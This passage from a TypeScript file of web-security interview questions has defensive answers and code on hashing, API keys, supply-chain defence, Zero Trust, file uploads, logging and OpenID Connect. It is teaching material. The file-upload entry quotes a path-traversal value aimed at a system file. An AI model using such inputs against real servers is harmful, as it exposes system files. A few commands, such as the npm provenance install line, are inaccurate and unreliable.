      'Storing user role in JWT without database validation',
      'Security through obscurity ("admin panel is hidden, no need to auth")',
      'Not sanitizing file paths (path traversal)',
    ],
    realWorldUse: 'Broken Access Control is #1 in OWASP Top 10. Found in virtually every application during security audits.',
    followUpQuestions: ['What is RBAC vs ABAC?', 'What is the principle of least privilege?'],
  },

  {
    id: 'sec-cryptography-basics',
    category: 'security',
    type: 'theory',
    question: 'What is the difference between hashing, encryption, and encoding?',
    difficulty: 'beginner',
    tags: ['cryptography', 'hashing', 'encryption', 'encoding'],
    shortAnswer: 'Encoding (Base64, URL): reversible transformation, no key needed — for data representation, not security. Hashing (SHA-256, bcrypt): one-way, cannot be reversed — for integrity and passwords. Encryption (AES, RSA): reversible with a key — for confidentiality of data in transit or at rest.',
    detailedExplanation: 'Encoding transforms data for compatibility (Base64 for binary in JSON, URL encoding for special chars) — anyone can decode it, no security. Hashing creates a fixed-length fingerprint — same input always produces same output, but you can\'t reverse it. Encryption uses a key to scramble data — only someone with the key can decrypt. Symmetric encryption (AES) uses one key. Asymmetric (RSA, ECDSA) uses key pairs (public encrypts, private decrypts).',
    example: {
      code: `// ENCODING — for representation, NOT security
const encoded = Buffer.from('Hello World').toString('base64');
// 'SGVsbG8gV29ybGQ='
const decoded = Buffer.from(encoded, 'base64').toString('utf8');
// 'Hello World' — trivially reversible, no key needed

// URL encoding
encodeURIComponent('hello world'); // 'hello%20world'

// HASHING — one-way, integrity verification
import { createHash } from 'crypto';

// SHA-256 — fast hash (for file integrity, digital signatures)
const fileHash = createHash('sha256')
  .update(fileBuffer)
  .digest('hex');

// Verify file integrity
const isValid = createHash('sha256').update(downloadedFile).digest('hex') === fileHash;

// bcrypt — slow hash (for passwords — the slowness is intentional!)
import bcrypt from 'bcrypt';
const hash = await bcrypt.hash('userPassword123', 12); // cost factor 12
const match = await bcrypt.compare('userPassword123', hash); // true

// SHA-256 is WRONG for passwords (too fast — 10 billion attempts/sec on GPU)
// bcrypt is RIGHT for passwords (deliberately slow)

// ENCRYPTION — reversible with key
import { createCipheriv, createDecipheriv, randomBytes } from 'crypto';

const key = randomBytes(32);   // 256-bit key (keep secret!)
const iv = randomBytes(16);    // Initialization vector (random, not secret)

// AES-256-GCM — authenticated encryption (detects tampering)
function encrypt(plaintext: string) {
  const cipher = createCipheriv('aes-256-gcm', key, iv);
  const encrypted = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const authTag = cipher.getAuthTag();
  return { encrypted: encrypted.toString('hex'), iv: iv.toString('hex'), authTag: authTag.toString('hex') };
}

function decrypt({ encrypted, iv, authTag }: ReturnType<typeof encrypt>) {
  const decipher = createDecipheriv('aes-256-gcm', key, Buffer.from(iv, 'hex'));
  decipher.setAuthTag(Buffer.from(authTag, 'hex'));
  return Buffer.concat([
    decipher.update(Buffer.from(encrypted, 'hex')),
    decipher.final()
  ]).toString('utf8');
}

// When to use each:
// Passwords → bcrypt/Argon2 (hash, never store plaintext or reversible)
// JWTs → HMAC-SHA256 signature (hash for integrity)
// PII at rest → AES-256 encryption (need to read it back)
// API communication → TLS (asymmetric key exchange + symmetric)`,
      language: 'typescript',
    },
    interviewAnswer: 'This is a common interview question because developers confuse these. Base64 is just encoding — anyone can decode it instantly. SHA-256 is a hash — you can\'t reverse it but it\'s too fast for passwords (GPU can try billions per second). Bcrypt is the right password hash — it\'s designed to be slow. AES encryption is for data you need to read back — like storing credit card numbers you\'ll need to charge later.',
    commonMistakes: [
      'Hashing passwords with MD5 or SHA-256 (too fast, easily brute-forced)',
      'Using encoding (Base64) for security',
      'Using the same IV/nonce for multiple AES encryptions',
    ],
    realWorldUse: 'Passwords (bcrypt), API signatures (HMAC-SHA256), stored PII (AES-256), HTTPS (RSA + AES).',
    followUpQuestions: ['What is the difference between symmetric and asymmetric encryption?', 'What is HMAC?'],
  },

  {
    id: 'sec-api-key-security',
    category: 'security',
    type: 'theory',
    question: 'How do you store and handle API keys and secrets securely?',
    difficulty: 'intermediate',
    tags: ['api-keys', 'secrets', 'security', 'storage'],
    shortAnswer: 'Never store API keys in code or git. Use environment variables locally, cloud secret managers (AWS Secrets Manager, HashiCorp Vault) in production. Hash stored API keys like passwords. Scope keys with minimum required permissions. Rotate regularly.',
    detailedExplanation: 'API key security has two sides: keys your app uses (third-party APIs) and keys your app issues (for your API). For keys you use: environment variables locally, KMS/Secrets Manager in production, never commit to git. For keys you issue: hash them before storing (can\'t read back = less damage if DB compromised), show to user only once at creation, support key rotation, scope to minimum permissions.',
    example: {
      code: `// Issuing API keys securely

import { randomBytes, createHash, timingSafeEqual } from 'crypto';

// Generate a new API key
function generateApiKey(): { key: string; hash: string } {
  const key = \`sk_\${randomBytes(32).toString('base64url')}\`; // ~43 chars, URL-safe
  const hash = hashApiKey(key);
  return { key, hash };
}

// Hash before storing (like passwords)
function hashApiKey(key: string): string {
  return createHash('sha256').update(key).digest('hex');
  // For higher security, use bcrypt (slower but collision-resistant)
}

// Store only the hash, return plain key once to user
app.post('/api/keys', authenticate, async (req, res) => {
  const { key, hash } = generateApiKey();

  await prisma.apiKey.create({
    data: {
      userId: req.user.id,
      name: req.body.name,
      keyHash: hash,          // Store hash only
      prefix: key.slice(0, 8), // Store prefix for display: "sk_abc1..."
      scopes: req.body.scopes ?? ['read'],
      lastUsedAt: null,
    }
  });

  // Return full key ONCE — user must copy it now
  res.status(201).json({
    key,                // Full key shown only once!
    prefix: key.slice(0, 8),
    message: 'Copy this key now. It will not be shown again.',
  });
});

// Authenticate incoming API key requests
async function authenticateApiKey(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader?.startsWith('Bearer sk_')) {
    return res.status(401).json({ error: 'Missing API key' });
  }

  const key = authHeader.slice(7);
  const hash = hashApiKey(key);

  // Look up by hash
  const apiKey = await prisma.apiKey.findFirst({
    where: { keyHash: hash, revokedAt: null },
    include: { user: true }
  });

  if (!apiKey) return res.status(401).json({ error: 'Invalid API key' });

  // Update last used
  await prisma.apiKey.update({
    where: { id: apiKey.id },
    data: { lastUsedAt: new Date() }
  });

  req.user = apiKey.user;
  req.apiKeyScopes = apiKey.scopes;
  next();
}

// Secret management in production
// AWS Secrets Manager — rotate automatically
const { SecretsManagerClient, GetSecretValueCommand } = require('@aws-sdk/client-secrets-manager');

const secretsClient = new SecretsManagerClient({ region: 'us-east-1' });

async function getSecret(secretName: string) {
  const response = await secretsClient.send(
    new GetSecretValueCommand({ SecretId: secretName })
  );
  return JSON.parse(response.SecretString);
}

// Load at startup — not on every request
const { STRIPE_SECRET_KEY, EMAIL_API_KEY } = await getSecret('prod/app/api-keys');`,
      language: 'typescript',
    },
    interviewAnswer: 'I follow the same principle for API keys as for passwords — hash before storing. If an attacker gets your database, hashed keys are useless to them. Show the key only once at creation and tell users to save it. For keys I use (Stripe, SendGrid), I store them in AWS Secrets Manager and load at startup — never in environment variables committed to git. Key rotation is critical — Stripe-style date-based versioning means you can rotate without downtime.',
    commonMistakes: [
      'Storing API keys in plain text in the database',
      'Committing .env files with real keys to git',
      'No key rotation or revocation mechanism',
    ],
    realWorldUse: 'Stripe, GitHub, AWS all follow these patterns. GitHub Secret Scanning detects accidentally committed API keys.',
    followUpQuestions: ['What is the difference between API keys and OAuth tokens?', 'How do you rotate an API key without downtime?'],
  },

  {
    id: 'sec-supply-chain',
    category: 'security',
    type: 'theory',
    question: 'What are supply chain attacks and how do you protect against them in Node.js?',
    difficulty: 'advanced',
    tags: ['supply-chain', 'npm', 'dependencies', 'security'],
    shortAnswer: 'Supply chain attacks compromise software through malicious or vulnerable dependencies. Protection: npm audit, Snyk, lockfiles, Dependabot, minimal dependencies, verify package integrity with checksums, use npm provenance.',
    detailedExplanation: 'The 2021 ua-parser-js, event-stream, and colors.js incidents demonstrated that a single compromised npm package can affect millions of applications. Vectors: typosquatting (lodash vs lodassh), malicious maintainer takeover, dependency confusion (private package name collision with public registry). Defence layers: npm audit for known CVEs, lockfile (package-lock.json) pins exact versions, Snyk/Socket.dev for behavioural analysis of new packages.',
    example: {
      code: `// Defence 1: Lock exact versions in package-lock.json
// Always commit package-lock.json
// Use npm ci (not npm install) in CI — respects lockfile exactly

// Defence 2: npm audit in CI — fail build on high severity
// package.json
{
  "scripts": {
    "audit": "npm audit --audit-level=high"
  }
}
// GitHub Actions:
// - run: npm audit --audit-level=high

// Defence 3: Verify package integrity
// package-lock.json contains integrity hashes:
// "integrity": "sha512-abc123..."
// npm ci verifies these on install

// Defence 4: Dependabot (automatic security PRs)
// .github/dependabot.yml
/*
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    ignore:
      - dependency-name: "lodash"
        update-types: ["version-update:semver-major"]
*/

// Defence 5: Minimal dependencies
// Audit your package.json — do you really need this package?
// 'left-pad' debacle: const leftPad = (s, n) => s.padStart(n);

// Defence 6: Check package before installing
// socket.dev — real-time analysis of package behaviour
// npm install socket (shows permissions the package requests)

// Defence 7: npm provenance — verify build origins (npm 9.5+)
// Packages can include signed provenance (source repo, build system)
npm install express --provenance

// Defence 8: Private registry for sensitive packages
// .npmrc
// registry=https://registry.npmjs.org
// @mycompany:registry=https://npm.mycompany.com

// Defence 9: Dependency confusion prevention
// Add your internal package names to npm with a placeholder
// OR configure your registry to block public fallback for scoped packages

// Detecting compromise
// Compare package checksums
npm cache verify
// Check for suspicious postinstall scripts:
cat node_modules/some-package/package.json | grep -A5 scripts`,
      language: 'javascript',
    },
    interviewAnswer: 'Supply chain attacks are terrifying because you trust your dependencies. My baseline: npm audit in every CI run (fail on high severity), Dependabot for weekly security updates, and package-lock.json always committed and respected via npm ci. I also audit what I install — does this package really need network access in its postinstall script? Socket.dev shows you package behavior before you install. The hardest attacks to prevent are maintainer takeovers of legitimate packages.',
    commonMistakes: [
      'Not committing package-lock.json (different versions in CI vs local)',
      'Using npm install in CI (ignores lockfile)',
      'Installing packages without checking for suspicious scripts',
    ],
    realWorldUse: 'The SolarWinds attack, Log4Shell, event-stream malware all demonstrated supply chain impact. Mandatory for SOC2/ISO27001 compliance.',
    followUpQuestions: ['What is dependency confusion?', 'What is the difference between npm install and npm ci?'],
  },

  {
    id: 'sec-zero-trust',
    category: 'security',
    type: 'theory',
    question: 'What is the Zero Trust security model and how does it apply to web applications?',
    difficulty: 'advanced',
    tags: ['zero-trust', 'security-model', 'architecture', 'defense-in-depth'],
    shortAnswer: '"Never trust, always verify" — every request must be authenticated and authorized regardless of origin. No implicit trust based on network location. Applies to: every API call (even internal), every user action, every service-to-service call. Assumes breach is inevitable.',
    detailedExplanation: 'Zero Trust replaced the perimeter model ("trusted inside, untrusted outside"). Key principles: verify explicitly (authenticate every request), use least privilege access (minimum necessary permissions), assume breach (design as if attacker is already inside). In practice: mutual TLS between services, short-lived tokens, per-request authorization, detailed audit logs, network segmentation, continuous monitoring.',
    example: {
      code: `// Zero Trust principles in a Node.js API

// 1. Verify explicitly — never trust because it's "internal"
// ❌ Old model: if request comes from internal network, trust it
// ✅ Zero Trust: authenticate EVERY request
app.use('/internal', authenticate); // Even internal endpoints need auth

// Service-to-service authentication (mTLS or service tokens)
const serviceToken = jwt.sign(
  { service: 'order-service', permissions: ['read:inventory'] },
  SERVICE_SECRET,
  { expiresIn: '5m' } // Short-lived
);

// 2. Least privilege — minimum necessary access
// ❌ JWT with all permissions
jwt.sign({ userId: '123', permissions: ['read', 'write', 'admin', 'delete'] }, secret);

// ✅ Scoped tokens
jwt.sign({ userId: '123', permissions: ['read:posts'] }, secret, { expiresIn: '1h' });

// 3. Assume breach — design as if attacker is inside
// a) Encrypt sensitive data at rest (not just in transit)
import { createCipheriv } from 'crypto';
// Encrypt PII before storing to DB — even if DB is compromised, data is encrypted

// b) Audit log every sensitive action
async function auditLog(userId: string, action: string, resource: string, metadata?: object) {
  await prisma.auditLog.create({
    data: {
      userId,
      action,           // 'user.delete', 'order.view', 'settings.update'
      resource,         // 'user:123', 'order:456'
      metadata: metadata ?? {},
      ipAddress: req.ip,
      userAgent: req.headers['user-agent'],
      timestamp: new Date(),
    }
  });
}

// c) Detect anomalies
const loginAttempts = await redis.incr(\`login:\${userId}:\${getHour()}\`);
if (loginAttempts > 10) {
  await notifySecurityTeam({ event: 'brute_force_attempt', userId, ip: req.ip });
}

// 4. Short-lived credentials
const accessToken = jwt.sign({ userId }, secret, { expiresIn: '15m' }); // Not 7 days
const apiKey = await generateScopedKey({ expiresAt: addDays(new Date(), 90) });

// 5. Network segmentation — even on same server
// Database only accepts connections from app server IP
// Redis only accessible from app servers
// No direct external access to internal services`,
      language: 'typescript',
    },
    interviewAnswer: 'Zero Trust changed how I think about internal services. The old model was "if it\'s inside our network, we trust it." Zero Trust says every request proves its identity, even service-to-service calls. In practice: short-lived tokens, mTLS between microservices, comprehensive audit logging so we know what happened when (not if) there\'s a breach. The "assume breach" mindset means I encrypt sensitive data at rest too — if someone gets the database dump, they still can\'t read the PII.',
    commonMistakes: [
      'Trusting requests from internal network IPs without authentication',
      'Long-lived service tokens (if compromised, long exposure window)',
      'No audit logging (can\'t tell what the attacker accessed)',
    ],
    realWorldUse: 'Google BeyondCorp pioneered Zero Trust. Mandated in US federal security frameworks (NIST SP 800-207).',
    followUpQuestions: ['What is mTLS?', 'What is the difference between Zero Trust and defence-in-depth?'],
  },

  {
    id: 'sec-file-upload-security',
    category: 'security',
    type: 'theory',
    question: 'What are the security risks of file uploads and how do you mitigate them?',
    difficulty: 'intermediate',
    tags: ['file-upload', 'security', 'mime-type', 'malware'],
    shortAnswer: 'Risks: malware upload (executable code), path traversal (../../etc/passwd), storing files in webroot (server-side execution), XXE via XML/SVG, zip bombs. Mitigations: validate MIME type by content (not extension), store outside webroot or in cloud storage, scan for malware, generate random filenames.',
    detailedExplanation: 'File uploads are a major attack surface. Attackers upload PHP/JS files to execute on server, disguise malware with innocent extensions (.jpg.php), use path traversal in filenames, upload SVGs with embedded JavaScript, or craft zip bombs (tiny file → gigabytes when extracted). Defence: validate by magic bytes (not extension), randomise filenames, serve from separate domain/S3, scan with ClamAV, limit size.',
    example: {
      code: `import multer from 'multer';
import { fromBuffer } from 'file-type';
import path from 'path';
import { randomBytes } from 'crypto';

// NEVER trust file extension or Content-Type header
// Always check magic bytes (actual file content)
const ALLOWED_MIME_TYPES = new Set([
  'image/jpeg',
  'image/png',
  'image/webp',
  'image/gif',
  'application/pdf',
]);

const MAX_SIZE = 5 * 1024 * 1024; // 5MB

// Use memory storage first — validate before saving
const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: MAX_SIZE,
    files: 1,
  },
});

async function validateAndStoreFile(buffer: Buffer, originalName: string) {
  // 1. Validate by magic bytes — not extension or Content-Type
  const fileType = await fromBuffer(buffer);

  if (!fileType || !ALLOWED_MIME_TYPES.has(fileType.mime)) {
    throw new Error(\`File type not allowed: \${fileType?.mime ?? 'unknown'}\`);
  }

  // 2. Generate random filename — no user-controlled name in path
  const ext = fileType.ext; // Extension from magic bytes, not from user
  const filename = \`\${randomBytes(16).toString('hex')}.\${ext}\`;

  // 3. Ensure no path traversal even with random names
  const safeName = path.basename(filename); // Remove any path components

  // 4. NEVER store in webroot — use cloud storage (S3)
  const s3Key = \`uploads/\${safeName}\`;
  await s3.send(new PutObjectCommand({
    Bucket: process.env.S3_BUCKET,
    Key: s3Key,
    Body: buffer,
    ContentType: fileType.mime,
    // Serve via CDN, not from the same server
    ContentDisposition: 'attachment', // Force download, not execution
  }));

  return s3Key;
}

app.post('/api/upload', authenticate, upload.single('file'), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file' });

  try {
    const s3Key = await validateAndStoreFile(req.file.buffer, req.file.originalname);

    // Store reference in database
    await prisma.attachment.create({
      data: {
        userId: req.user.id,
        s3Key,
        originalName: path.basename(req.file.originalname), // Sanitised
        mimeType: req.file.mimetype,
        size: req.file.size,
      }
    });

    res.status(201).json({ key: s3Key });
  } catch (err) {
    res.status(422).json({ error: err.message });
  }
});

// For SVG — strip embedded JavaScript with DOMPurify
import DOMPurify from 'isomorphic-dompurify';
const safeSvg = DOMPurify.sanitize(svgContent, {
  USE_PROFILES: { svg: true, svgFilters: true }
});`,
      language: 'typescript',
    },
    interviewAnswer: 'File upload security requires several layers. The most important: validate by magic bytes, not extension. A file named invoice.pdf.php is still dangerous if your server executes PHP. I always store uploads in S3 (not on the same server as the code) and generate random filenames. For images, I re-process them through sharp — this strips any metadata, embedded scripts, and reencodes the file so even a malicious image becomes a safe one.',
    commonMistakes: [
      'Validating file type by extension only',
      'Storing uploads in the webroot (allows code execution)',
      'Trusting the Content-Type header from the request',
    ],
    realWorldUse: 'Any application with file upload. The 2015 TalkTalk breach involved malicious file upload to execute server-side code.',
    followUpQuestions: ['What are magic bytes?', 'What is a zip bomb?'],
  },

  {
    id: 'sec-logging-security',
    category: 'security',
    type: 'theory',
    question: 'What should and should NOT be logged from a security perspective?',
    difficulty: 'intermediate',
    tags: ['logging', 'security', 'audit-trail', 'sensitive-data'],
    shortAnswer: 'DO log: authentication events, authorization failures, data access (especially sensitive), errors with context, admin actions. DON\'T log: passwords, tokens, credit card numbers, PII, API keys, request bodies with sensitive fields.',
    detailedExplanation: 'Security logging serves two purposes: detecting attacks in real-time and forensic analysis after an incident. Insufficient logging means attacks go undetected. Over-logging sensitive data creates another breach vector — logs themselves become a target. Balance: log enough to reconstruct what happened, redact sensitive values. OWASP Logging Cheat Sheet defines categories: authentication, authorization, application errors, business logic events.',
    example: {
      code: `import pino from 'pino';

const logger = pino({
  redact: {
    // Automatically redact sensitive fields from ALL logs
    paths: [
      'password',
      'req.headers.authorization',
      'req.body.password',
      'req.body.creditCard',
      'req.body.ssn',
      'res.body.token',
      '*.token',
      '*.apiKey',
    ],
    censor: '[REDACTED]', // Replace with this
  }
});

// ✅ DO log: security events
async function loginHandler(req, res) {
  const { email, password } = req.body;
  const user = await findUser(email);

  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    // Log failed attempt (for brute force detection)
    logger.warn({
      event: 'auth.login.failed',
      email, // OK to log email for security monitoring
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      // password: NOT logged (auto-redacted by pino config)
    });
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  logger.info({
    event: 'auth.login.success',
    userId: user.id,
    ip: req.ip,
  });
}

// ✅ DO log: sensitive data access
app.get('/api/users/:id/ssn', authenticate, async (req, res) => {
  logger.info({
    event: 'sensitive_data.accessed',
    resourceType: 'ssn',
    resourceId: req.params.id,
    accessedBy: req.user.id,
    reason: req.headers['x-access-reason'], // Require reason header
    ip: req.ip,
  });
  // Actual SSN value is NOT logged
});

// ✅ DO log: authorization failures
function authorize(role: string) {
  return (req, res, next) => {
    if (req.user.role !== role) {
      logger.warn({
        event: 'authz.denied',
        userId: req.user.id,
        requiredRole: role,
        actualRole: req.user.role,
        endpoint: req.path,
        ip: req.ip,
      });
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  };
}

// ❌ DON'T log sensitive data
logger.info({ user: req.body }); // Might contain password!
logger.info({ token: jwtToken }); // Token in logs = compromised

// Audit log to separate, immutable storage
await auditDB.insert({
  action: 'invoice.downloaded',
  userId: req.user.id,
  resourceId: invoiceId,
  timestamp: new Date(),
  // Write-once storage — can't be tampered with
});`,
      language: 'typescript',
    },
    interviewAnswer: 'Security logging is a balance — too little and you can\'t detect or investigate incidents, too much and logs become a breach vector themselves. I configure pino\'s redact option to automatically strip sensitive fields from all logs — it works even when developers forget. I always log authentication events (success and failure), authorization denials, and access to sensitive data. For compliance (PCI DSS, HIPAA), audit logs must be immutable and retained for specific periods.',
    commonMistakes: [
      'Logging request bodies without redacting passwords/tokens',
      'No logging of failed authentication attempts (can\'t detect brute force)',
      'Logs accessible to too many team members (logs contain sensitive context)',
    ],
    realWorldUse: 'SOC2, PCI DSS, HIPAA all have logging requirements. SIEM systems (Splunk, Datadog Security) analyse logs for attack patterns.',
    followUpQuestions: ['What is a SIEM?', 'What logs are required for PCI DSS compliance?'],
  },

  {
    id: 'sec-openid-connect',
    category: 'security',
    type: 'theory',
    question: 'What is OpenID Connect and how does it differ from OAuth 2.0?',
    difficulty: 'intermediate',
    tags: ['openid-connect', 'oauth', 'authentication', 'jwt'],
    shortAnswer: 'OAuth 2.0 handles authorization (what can I access?). OpenID Connect adds an identity layer on top of OAuth 2.0 (who is this user?) via an ID Token (JWT with user claims). OIDC = OAuth 2.0 + ID Token + /userinfo endpoint.',
    detailedExplanation: 'OAuth 2.0 was designed for delegated access — "allow app X to access my data on service Y." It doesn\'t standardise how to get user info. OpenID Connect extends OAuth 2.0 with: ID Token (signed JWT with user identity claims like sub, email, name), /userinfo endpoint, standard claims (sub, email, name, picture), discovery document (/.well-known/openid-configuration). Most "Login with Google" implementations use OIDC.',
    example: {
      code: `// OAuth 2.0 (authorization only) — what the token lets you access
// Access Token: "here's a token to read user's Google Drive"
// Token is opaque — you don't know who the user is from the token itself

// OpenID Connect (authentication + authorization)
// Authorization endpoint request:
// GET /authorize?
//   response_type=code&
//   client_id=xxx&
//   scope=openid email profile&  ← 'openid' scope triggers OIDC
//   redirect_uri=https://app.com/callback&
//   state=random&
//   nonce=random  ← OIDC-specific, prevents replay attacks

// Token endpoint response (OIDC adds id_token):
// {
//   "access_token": "eyJ...",     ← OAuth: access user's resources
//   "id_token": "eyJ...",         ← OIDC: identity information
//   "token_type": "Bearer",
//   "expires_in": 3600
// }

// ID Token (JWT) payload — who the user is
// {
//   "sub": "1234567890",          ← Unique user identifier
//   "email": "alex@gmail.com",
//   "name": "Alex Smith",
//   "picture": "https://...",
//   "email_verified": true,
//   "iss": "https://accounts.google.com",  ← Issuer
//   "aud": "your-client-id",              ← Must match your app
//   "exp": 1234567890,                     ← Expiry
//   "iat": 1234567880,                     ← Issued at
//   "nonce": "abc123"                      ← Matches what you sent
// }

// Node.js OIDC with openid-client
import { Issuer, generators } from 'openid-client';

// Discover OIDC configuration
const googleIssuer = await Issuer.discover('https://accounts.google.com');
const client = new googleIssuer.Client({
  client_id: process.env.GOOGLE_CLIENT_ID,
  client_secret: process.env.GOOGLE_CLIENT_SECRET,
  redirect_uris: ['https://myapp.com/auth/callback'],
  response_types: ['code'],
});

app.get('/auth/login', (req, res) => {
  const nonce = generators.nonce();   // Prevent replay attacks
  const state = generators.state();    // Prevent CSRF

  req.session.nonce = nonce;
  req.session.state = state;

  const authUrl = client.authorizationUrl({
    scope: 'openid email profile',
    nonce,
    state,
  });
  res.redirect(authUrl);
});

app.get('/auth/callback', async (req, res) => {
  const params = client.callbackParams(req);

  const tokenSet = await client.callback(
    'https://myapp.com/auth/callback',
    params,
    { nonce: req.session.nonce, state: req.session.state }
    // Automatically verifies ID token signature, expiry, nonce
  );

  const claims = tokenSet.claims(); // Verified user identity
  const userId = claims.sub;        // Globally unique user ID

  // Upsert user in your database
  const user = await prisma.user.upsert({
    where: { googleId: userId },
    create: { googleId: userId, email: claims.email, name: claims.name },
    update: { email: claims.email, name: claims.name },
  });

  req.session.userId = user.id;
  res.redirect('/dashboard');
});`,
      language: 'typescript',
    },
    interviewAnswer: 'The key distinction: OAuth 2.0 answers "what can I do?" (authorization), OIDC answers "who are you?" (authentication). Before OIDC, every provider had a different way to get user info after OAuth. OIDC standardised it with the ID Token and /userinfo endpoint. The nonce parameter is OIDC-specific and prevents replay attacks — if an attacker intercepts an ID Token and tries to use it again, the nonce check fails.',
    commonMistakes: [
      'Using access token for identity instead of ID token',
      'Not verifying the nonce (allows replay attacks)',
      'Not validating the aud claim (ID token could be from different app)',
    ],
    realWorldUse: '"Login with Google/Apple/Microsoft" all use OIDC. Auth0, Cognito, Okta are OIDC providers.',
    followUpQuestions: ['What claims are in an ID Token?', 'What is the difference between ID token and access token?'],
  },
];
